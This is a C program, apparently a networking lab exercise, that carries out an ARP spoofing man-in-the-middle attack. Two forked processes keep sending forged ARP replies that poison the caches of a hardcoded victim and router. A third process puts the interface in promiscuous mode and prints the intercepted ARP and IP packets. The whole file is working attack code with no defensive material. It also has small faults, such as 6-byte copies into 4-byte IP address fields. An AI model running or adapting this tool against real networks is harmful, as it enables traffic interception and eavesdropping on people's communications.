#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <unistd.h>
#include <pthread.h> 
#include <signal.h>
#include "arp.h"

#define SPOOFING_DELAY 1
#define ARP_OPERATION_REQUEST 1
#define ARP_OPERATION_REPLY 2

/* Constant parameters */
/* TODO Change destination addresses to be a parameter */
uint8_t this_mac[6];
uint8_t bcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t dst_mac[6] =	{0x00, 0x00, 0x00, 0x22, 0x22, 0x22};
uint8_t src_mac[6] =	{0x00, 0x00, 0x00, 0xaa, 0x00, 0x02};

uint8_t ROUTER_IP[4] = {0x0a, 0x00, 0x00, 0x01};
uint8_t VICTIM_IP[4] = {0x0a, 0x00, 0x00, 0x14};

int *running;

/* Processes functions, these are independent processes */

void HandleSignal(int signal)
{
	printf("\n");
	*running = 0;
}

int CompareMac(uint8_t *mac1, uint8_t *mac2)
{
	int i;
	for (i = 0; i < 6; i++)
	{
		if (*mac1 != *mac2)
			return 0;
		mac1++;
		mac2++;
	}
	return 1;
}

int CreateSocket(struct sockaddr_ll *socket_address)
{
	struct ifreq ifopts, if_idx, if_mac;
	char ifName[IFNAMSIZ];
	int sockfd;	
	
	/* Get interface name */
	strcpy(ifName, DEFAULT_IF);
		
	/* Open RAW socket */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		perror("socket");
	
	/* Set interface to promiscuous mode */
	strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
	ifopts.ifr_flags |= IFF_PROMISC;
	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);
	
	/* Get the index of the interface */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
		perror("SIOCGIFINDEX");
	socket_address->sll_ifindex = if_idx.ifr_ifindex;
	socket_address->sll_halen = ETH_ALEN;
	
	/* Get the MAC address of the interface */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		perror("SIOCGIFHWADDR");	
	memcpy(this_mac, if_mac.ifr_hwaddr.sa_data, 6);
	
	return sockfd;
}

void PopulateEthBuffer(union eth_buffer *buffer_u)
{
	/* fill the Ethernet frame header */
	memcpy(buffer_u->cooked_data.ethernet.dst_addr, bcast_mac, 6);
	memcpy(buffer_u->cooked_data.ethernet.src_addr, src_mac, 6);
	buffer_u->cooked_data.ethernet.eth_type = htons(ETH_P_ARP);

	/* fill payload data (incomplete ARP request example) */
	buffer_u->cooked_data.payload.arp.hw_type = htons(1);
	buffer_u->cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
	buffer_u->cooked_data.payload.arp.hlen = 6;
	buffer_u->cooked_data.payload.arp.plen = 4;
	buffer_u->cooked_data.payload.arp.operation = htons(ARP_OPERATION_REPLY);
}

/* ARP Spoofing To Victim */
void P1()
{
	signal(SIGINT, HandleSignal);
	signal(SIGABRT, HandleSignal);
	
	union eth_buffer buffer_u;
	
	struct sockaddr_ll socket_address;
	
	int sockfd = CreateSocket(&socket_address);
	
	PopulateEthBuffer(&buffer_u);
	
	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, ROUTER_IP, 6);
	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, VICTIM_IP, 6);

	/* Send it.. */
	while (*running)
	{
		memcpy(socket_address.sll_addr, dst_mac, 6);
		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("P1 Send failed\n");
		
		sleep(SPOOFING_DELAY);
	}
}

/* ARP Spoofing To Victim */
void P2()
{
	signal(SIGINT, HandleSignal);
	signal(SIGABRT, HandleSignal);
	
	union eth_buffer buffer_u;
	
	struct sockaddr_ll socket_address;
	
	int sockfd = CreateSocket(&socket_address);
	
	PopulateEthBuffer(&buffer_u);
	
	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, VICTIM_IP, 6);
	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, ROUTER_IP, 6);

	/* Send it.. */
	while (*running)
	{
		memcpy(socket_address.sll_addr, dst_mac, 6);
		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("P1 Send failed\n");
		
		sleep(SPOOFING_DELAY);
	}
}

/* Man in The Middle. Print all ARP and IP packets that are not from P1 or P2 */
void P3()
{
	signal(SIGINT, HandleSignal);
	signal(SIGABRT, HandleSignal);
	
	union eth_buffer buffer_u;
	
	int numbytes, i;
	struct in_addr addr;
	struct sockaddr_ll socket_address;
	
	int sockfd = CreateSocket(&socket_address);	
	
	printf("this mac address: ");
	for (i = 0; i < 5; i++)
		printf("%02x:", this_mac[i]);
	printf("%02x", this_mac[5]);
	printf("\n");
	
	/* To receive data (in this case we will inspect ARP and IP packets)... */

	while (*running){
		numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
		
		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
			/* do not print packets from P1 or P2 */
			if (CompareMac(&buffer_u.cooked_data.payload.arp.src_hwaddr[0], &src_mac[0]))
				continue;
			
			printf("******* ARP packet\n");
			printf("	HW Type: %d\n", buffer_u.cooked_data.payload.arp.hw_type);
			printf("	Protocol Type: %d\n", buffer_u.cooked_data.payload.arp.prot_type);
			printf("	HLEN: %d\n", buffer_u.cooked_data.payload.arp.hlen);
			printf("	DLEN: %d\n", buffer_u.cooked_data.payload.arp.plen);
			printf("	Operation: %d\n", buffer_u.cooked_data.payload.arp.operation);
			
			printf("	Sender HA: ");
			for (i = 0; i < 5; i++)
				printf("%02x:", buffer_u.cooked_data.payload.arp.src_hwaddr[i]);
			printf("%02x", buffer_u.cooked_data.payload.arp.src_hwaddr[5]);
			printf("\n");
			
			printf("	Sender IP: ");
			addr.s_addr = *(uint32_t*)&buffer_u.cooked_data.payload.arp.src_paddr;
			printf( "%s\n", inet_ntoa(addr));
			
			printf("	Target HA: ");
			for (i = 0; i < 5; i++)
				printf("%02x:", buffer_u.cooked_data.payload.arp.tgt_hwaddr[i]);
			printf("%02x", buffer_u.cooked_data.payload.arp.tgt_hwaddr[5]);
			printf("\n");
			
			printf("	Target IP: ");
			addr.s_addr = *(uint32_t*)&buffer_u.cooked_data.payload.arp.tgt_paddr;
			printf( "%s\n\n", inet_ntoa(addr));
			
			continue;
		}
		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
			printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
				numbytes,
				buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
				buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
				buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
				buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
				buffer_u.cooked_data.payload.ip.proto
			);
			continue;
		}
				
		printf("Got a packet that is neither ARP or IP, %d bytes\n", numbytes);
	}
}

int main(int argc, char *argv[])
{		
	running = malloc(sizeof (int32_t));
	*running = 1;
	int processNr;

	int pid = fork();
	
	if (pid == -1)
	{
		printf("Fork failed for first child.\n");
		exit(1);
	}
	
	if (pid) // P1
	{
		pid = fork();
		if (pid == -1)
		{
			printf("Fork failed for second child.\n");
			exit(1);
		}
	
		if (pid) // P1
		{
			processNr = 1;
			P1();
		}
		else // P3
		{
			processNr = 3;
			P3();
		}
	}
	else // P2
	{
		processNr = 2;
		P2();
	}
	
	printf("Process %d stopping...\n", processNr);

	return 0;
}
